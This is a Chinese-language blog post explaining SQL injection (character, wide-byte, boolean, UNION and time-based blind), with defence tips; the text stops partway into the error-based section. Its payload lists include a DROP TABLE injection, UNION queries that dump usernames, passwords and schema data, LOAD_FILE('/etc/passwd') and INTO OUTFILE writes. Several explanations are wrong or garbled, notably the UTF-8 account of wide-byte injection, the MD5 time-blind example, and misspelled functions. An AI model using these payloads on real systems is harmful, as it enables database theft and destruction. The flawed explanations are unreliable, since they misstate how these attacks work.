<!DOCTYPE html><html class="hide-aside" lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入原理 | </title><meta name="author" content="Roy"><meta name="copyright" content="Roy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、原理SQL注入的原理很简单,就是利用网站后台数据库的漏洞,注入恶意的SQL语句。 具体来说,主要有以下几个方面:  网站没有对用户输入进行妥善的过滤和清理,允许包含特殊SQL字符如’;&#x2F;  网站直接将用户的输入作为SQL查询语句的一部分,而没有做安全预处理。  攻击者通过往表单或URL中注入恶意的SQL语句,利用上述漏洞执行攻击。  成功注入后,攻击者可以修改或提取数据库中的数据,或">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入原理">
<meta property="og:url" content="http://localhost:4000/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/index.html">
<meta property="og:site_name">
<meta property="og:description" content="一、原理SQL注入的原理很简单,就是利用网站后台数据库的漏洞,注入恶意的SQL语句。 具体来说,主要有以下几个方面:  网站没有对用户输入进行妥善的过滤和清理,允许包含特殊SQL字符如’;&#x2F;  网站直接将用户的输入作为SQL查询语句的一部分,而没有做安全预处理。  攻击者通过往表单或URL中注入恶意的SQL语句,利用上述漏洞执行攻击。  成功注入后,攻击者可以修改或提取数据库中的数据,或">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://localhost:4000/img/avatar.png">
<meta property="article:published_time" content="2023-11-29T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-30T10:55:41.000Z">
<meta property="article:author" content="Roy">
<meta property="article:tag" content="SQL">
<meta property="article:tag" content="数据库 - 渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://localhost:4000/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://localhost:4000/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入原理',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-30 18:55:41'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/weibo.css"><link rel="stylesheet" href="/css/footer.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 5000);</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/Blog3.png')"><nav id="nav"><span id="blog-info"><a href="/" title=""><img class="site-icon" src="/img/logo.png"/><span class="site-name"></span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入原理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-29T16:00:00.000Z" title="发表于 2023-11-30 00:00:00">2023-11-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-30T10:55:41.000Z" title="更新于 2023-11-30 18:55:41">2023-11-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/SQL/">SQL</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入原理"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h3><p>SQL注入的原理很简单,就是利用网站后台数据库的漏洞,注入恶意的SQL语句。</p>
<p>具体来说,主要有以下几个方面:</p>
<ol>
<li><p>网站没有对用户输入进行妥善的过滤和清理,允许包含特殊SQL字符如’;&#x2F;</p>
</li>
<li><p>网站直接将用户的输入作为SQL查询语句的一部分,而没有做安全预处理。</p>
</li>
<li><p>攻击者通过往表单或URL中注入恶意的SQL语句,利用上述漏洞执行攻击。</p>
</li>
<li><p>成功注入后,攻击者可以修改或提取数据库中的数据,或者执行其他有害操作。</p>
</li>
</ol>
<p>举个例子:</p>
<p>正常的SQL语句可能是:</p>
<p><code>select * from users where name = &#39;$name&#39;;</code></p>
<p>$name 是从用户输入中获取的。</p>
<p>如果用户输入:</p>
<p><code>test&#39;); drop table users; --</code></p>
<p>则最终的SQL语句会变成:</p>
<p><code>select * from users where name = &#39;test&#39;); drop table users; --&#39;</code></p>
<p>导致users表被删除。</p>
<p>通过这种方式,攻击者就可以注入任意SQL语句,造成严重后果。</p>
<p>所以,SQL注入的原理就是:</p>
<ol>
<li><p>通过利用网站没有对用户输入进行足够过滤和清理,</p>
</li>
<li><p>将含有特殊SQL字符的字符串注入SQL语句中,</p>
</li>
<li><p>执行恶意的SQL操作,获取数据或造成破坏。</p>
</li>
</ol>
<p>总的来说, SQL注入利用的是网站应用程序中对用户输入再础安全检查上的不足,通过恶意SQL操作达到攻击目标。</p>
<p>可以通过妥善的过滤参数、使用安全预处理语句来防范SQL注入。</p>
<p>主要的SQL注入Payload有:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>检测是否存在SQL注入漏洞的基础Payload。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1--</span><br></pre></td></tr></table></figure>

<p>注释后面的SQL语句,并返回真值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure>

<p>使用#注释后面的SQL。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27;/*</span><br></pre></td></tr></table></figure>

<p>使用&#x2F;*注释后面的SQL语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>复杂的逻辑判断语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select 1,2,3--</span><br></pre></td></tr></table></figure>

<p>尝试联合查询,列出数据库表结构。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select table_name from information_schema.tables --</span><br></pre></td></tr></table></figure>

<p>查询数据表名称。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select column_name from information_schema.columns where table_name=&#x27;users&#x27; --</span><br></pre></td></tr></table></figure>

<p>查询用户数据表的列名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=0 union select 1,username,password from users --</span><br></pre></td></tr></table></figure>



<p>尝试列出用户信息。</p>
<p>除此之外,还有各种基于时间的Payload、存储过程注入Payload等,上述Payload主要用于初步检测SQL注入漏洞和获取基本信息。</p>
<p>每个Payload攻击目标的反应不同,最好编写一个Payloads列表,逐一测试应用程序的响应。</p>
<p>希望能为您提供参考!请谨防SQL注入攻击。</p>
<ol>
<li><h5 id="字符注入"><a href="#字符注入" class="headerlink" title="字符注入"></a>字符注入</h5><p>什么是SQL字符注入:</p>
<p>当用户的输入信息没有正确过滤并作为SQL查询语句的一部分时,攻击者就可以构造特殊格式的输入,最终修改原本SQL查询的结构,从而实现未授权获取数据或执行 undesirable 操作。</p>
<p>举个例子:</p>
<p>假设一个网站有一个用户登录表单,要求输入用户名和密码。我们的SQL查询可能是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name = &#x27;$name&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果用户名为’admin’ ‘ OR ‘1’&#x3D;’1’,最终组成的SQL查询为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name = &#x27;admin&#x27; &#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>

<p>‘OR ‘1’&#x3D;’1’总是成立,所以所有用户都可以登录。</p>
<p>通过这种方法,攻击者可以获取其他用户的敏感信息,甚至读取数据库中所有表的数据。</p>
<p>这就是SQL字符注入的基本原理。</p>
</li>
<li><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>宽字节注入(Unicode&#x2F;UTF-8注入)是一种SQL注入的变种。</p>
<p>与普通的SQL注入不同的是,宽字节注入利用UTF-8编码来注入攻击字符串,以 evade 输入过滤器。</p>
<p>具体来说:</p>
<ul>
<li><p>常规SQL注入使用ANSI字符集,过滤器可以很容易识别和过滤掉。</p>
</li>
<li><p>而宽字节注入使用UTF-8编码,可以构造出过滤器无法识别的多字节序列。</p>
</li>
<li><p>过滤器可能只检查ASCII范围内的字符,而忽略UTF-8多字节序列。</p>
</li>
</ul>
<p>因此,攻击者可以使用 UTF-8 编码的特殊字符来构造出过滤器无法识别的注入语句。</p>
<p>举个例子:</p>
<p>普通SQL注入语句:<br><code>&#39; or 1=1 --</code></p>
<p>宽字节注入语句:<br><code>\u0027 or 1=1 --</code></p>
<p>其中 \u0027 是 UTF-8 编码的单引号字符。</p>
<p>这样就可以evade简单的输入过滤,达到SQL注入的效果。</p>
<p>防护宽字节注入的方法是:</p>
<ul>
<li>使用白名单、黑名单,检查所有可能的UTF-8多字节序列</li>
<li>对所有输入执行decode和再encode,确保它是规范的UTF-8</li>
<li>对所有输入执行escape()函数来转义特殊字符</li>
<li>使用参数化查询,而不是组合SQL字符串</li>
</ul>
<p>总的来说,宽字节注入就是利用UTF-8编码构造出难以检测的注入攻击字符串,它属于SQL注入的变种。</p>
</li>
<li><h5 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h5><p>SQL布尔注入是一种SQL注入攻击,攻击者利用Where子句中的条件表达式来实现注入。</p>
<p>举个例子:</p>
<p>假设有一个查询用户名和密码的SQL语句:</p>
<p><code>SELECT * FROM users WHERE name = &#39;user&#39; AND password = &#39;pass&#39;;</code></p>
<p>如果用户输入的用户名为’or’1’&#x3D;’,最终的SQL语句变为:</p>
<p><code>SELECT * FROM users WHERE name = &#39;or&#39;1&#39;=&#39; AND password = &#39;pass&#39;;</code></p>
<p>‘or 1&#x3D;’ 的条件永远为true,因此会返回所有用户。</p>
<p>这就是SQL布尔注入的基本原理,攻击者利用<code>OR</code>、<code>AND</code>、<code>&gt;</code>、<code>&lt;</code>等布尔运算符和比较运算符构造条件,让查询总是为true,从而获取数据。</p>
<p>举个更复杂的例子:</p>
<p><code>SELECT * FROM users WHERE id &lt;= &#39;(select id from users limit 0,1)&#39;;</code></p>
<p>通过此语句,攻击者可以获取users表中的第一个用户的id。</p>
<p>常见的SQL布尔注入 payload有:</p>
<ul>
<li><code>OR 1=1</code></li>
<li><code>OR 1&gt;0</code> </li>
<li><code>OR &#39;a&#39;=&#39;a</code></li>
<li><code>(select * from users) limit 1,1</code></li>
</ul>
<p>总的来说,SQL布尔注入利用where子句中的条件表达式来实现注入,获取数据。防范的方法主要是正确过滤和验证输入,使用prepared statements。</p>
</li>
<li><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>SQL联合查询注入是 attackers 通过利用网站的 SQL UNION 语句来实施 SQL 注入攻击的一种方法。</p>
<p>举个例子:</p>
<p>假设有一条查询用户信息的 SQL 语句:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$user&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>通过 UNION,攻击者可以将自己的查询添加上去:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 UNION SELECT column1, column2 FROM table--</span></span><br></pre></td></tr></table></figure>

<p>最终变为:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> <span class="keyword">table</span><span class="comment">--&#x27; ;</span></span><br></pre></td></tr></table></figure>

<p>这会将攻击者的查询结果联接到原始查询的结果后面。</p>
<p>通过这种方式,攻击者可以获取数据库中的敏感信息。</p>
<p>一个更完整的例子:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1 UNION SELECT 1,user(),3 -- &#x27;</span> </span><br></pre></td></tr></table></figure>

<p>会返回数据库用户名,攻击者就可以获悉数据库的登录凭证。</p>
<p>防范方法主要是:</p>
<ul>
<li>不允许 UNION 关键字</li>
<li>限制 SELECT 的列数</li>
<li>过滤特殊字符</li>
<li>使用 Prepared Statements</li>
</ul>
<p>总的来说,SQL 联合查询注入通过利用 UNION 语句联接攻击者自定义的查询,从而实现数据获取。正确处理用户输入和使用参数化查询是防范的关键。</p>
<p>希望能给大家一个SQL注入的全面了解。</p>
<h6 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h6><p>最常见的SQL联合查询注入payload有:</p>
<p>1.简单获取一列数据</p>
<p><code>&#39; UNION SELECT column FROM table</code></p>
<p>2.获取当前数据库名称</p>
<p><code>&#39; UNION SELECT database()</code></p>
<p>3.获取当前用户名</p>
<p><code>&#39; UNION SELECT user()</code></p>
<p>4.获取所有表名称</p>
<p><code>&#39; UNION SELECT table_name FROM information_schema.tables</code></p>
<p>5.获取某个特定表的所有列名</p>
<p><code>&#39; UNION SELECT column_name FROM information_schema.columns WHERE table_name = &#39;table_name&#39;</code></p>
<p>6.获取整张表的数据</p>
<p><code>&#39; UNION SELECT * FROM table</code></p>
<p>7.利用LOAD_FILE获取文件内容</p>
<p><code>&#39; UNION SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code></p>
<p>8.执行操作语句</p>
<p><code>&#39; UNION SELECT 1,(SELECT &#39;&lt;sql操作&gt;&#39; FROM DUAL),3--</code></p>
<p>9.利用判断表达式执行操作</p>
<p><code>&#39; UNION SELECT 1 WHERE &#39;&lt;sql操作&gt;&#39;</code></p>
<p>10.利用定时任务执行操作</p>
<p><code>&#39; UNION SELECT 1,(SELECT &#39;&lt;sql操作&gt;&#39; FROM DUAL),3 INTO OUTFILE &#39;/tmp/xxx.sql&#39; -- </code></p>
<p>以上这些都是常见的SQL联合查询注入payload。</p>
<p>主要还是通过<code>UNION</code>关键字联接攻击者的查询语句,获取数据库敏感信息或执行恶意操作。</p>
<p>防范方法主要是过滤<code>UNION</code>关键字、限制<code>SELECT</code>列数、过滤特殊字符以及使用参数化查询。</p>
<p>希望能为大家提供参考!如果还有其他有价值的payload,欢迎指正。</p>
</li>
<li><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>SQL时间盲注注入是一种通过分析数据库响应时间的差异来获取数据的注入技术。</p>
<p>举个例子:</p>
<p>假设有一个查询密码的SQL语句:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span>MD5(<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>正常情况下,数据库会很快返回结果。</p>
<p>利用时间盲注,攻击者可以构造如下查询:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> password <span class="keyword">LIKE</span> MD5(concat(<span class="string">&#x27;1234&#x27;</span>,<span class="built_in">substring</span>(passwordtext,<span class="number">1</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>

<p>这里会根据实际密码的第一个字符来执行MD5哈希,数据库需要很长时间才能返回结果。</p>
<p>攻击者可以先猜a - z,如果响应快则密码第一个字符不在这26个字母内。</p>
<p>然后继续猜其他字符,最终能逐渐获取完整密码。</p>
<p>通过不断缩小猜测范围,分析响应时间的差异来获取数据。</p>
<p>另一个例子:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">&lt;=</span><span class="number">1</span> <span class="keyword">AND</span> id<span class="operator">&gt;=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">&lt;=</span>(<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>,<span class="number">1</span>) <span class="keyword">AND</span> id<span class="operator">&gt;=</span>(<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>前者数据库会很快返回,后者需要更长时间执行子查询。</p>
<p>通过getTime的差异判断是否执行了子查询,最终获取数据。</p>
<p>总的来说,时间盲注通过构造有条件的 SQL 语句,分析数据库执行时间的差异来逐渐获取信息。</p>
<p>常见的防御措施包括:固定响应时间、过滤输入、记录恶意请求等。</p>
<h6 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h6><p>最常见的SQL时间盲注payload有:</p>
<ol>
<li>获取数据库版本</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> benchark(<span class="number">1000000</span>,SHA1(RAND())))<span class="operator">&gt;</span>(<span class="keyword">SELECT</span> benchark(<span class="number">1000000</span>,SHA1(RAND())))</span><br></pre></td></tr></table></figure>

<p>时间差异可知数据库版本。</p>
<ol start="2">
<li>获取表名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>))VOIUQD <span class="keyword">join</span> (<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables)xZ limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>存在表则耗时5秒,不存在则快。</p>
<ol start="3">
<li>获取列名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>)) kJztgi <span class="keyword">join</span> (<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) fym limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>同上,存在列名则耗时5秒。</p>
<ol start="4">
<li>获取数据</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>)) <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>)rAxG limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>获取 users 表第一个用户的 username 。</p>
<ol start="5">
<li>执行操作</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> SLEEP(<span class="number">5</span>))Cu <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&lt;sql操作语句&gt;&#x27;</span>)ihh limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>执行leep为5秒的操作,检测时间差异。</p>
<p>…</p>
<p>总的来说,SQL时间盲注payload主要通过构造有条件的SQL语句,分析数据库执行时间差异去盲注 databases 中的数据。</p>
<p>通过不断缩小查询范围,最终获取期望结果。</p>
<p>防御方法是固定响应时间、过滤所有输入、监控恶意请求等。 希望能为大家提供参考!</p>
</li>
<li><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>报错注入是一种SQL注入技术。当数据库因为特殊的SQL语句产生错误时,通过分析数据库返回的错误信息,来获取隐藏的数据。</p>
<p>报错注入的工作原理:</p>
<ol>
<li><p>攻击者构造一个会产生数据库错误的SQL语句。</p>
</li>
<li><p>数据库正确处理时不会有响应,产生错误后会返回详细的错误信息。</p>
</li>
<li><p>通过分析错误信息,猜测数据库结构和数据。</p>
</li>
<li><p>逐渐获取更多的数据。</p>
</li>
</ol>
<p>举个例子:</p>
<p>一个查询用户名和密码的SQL语句可能是:</p>
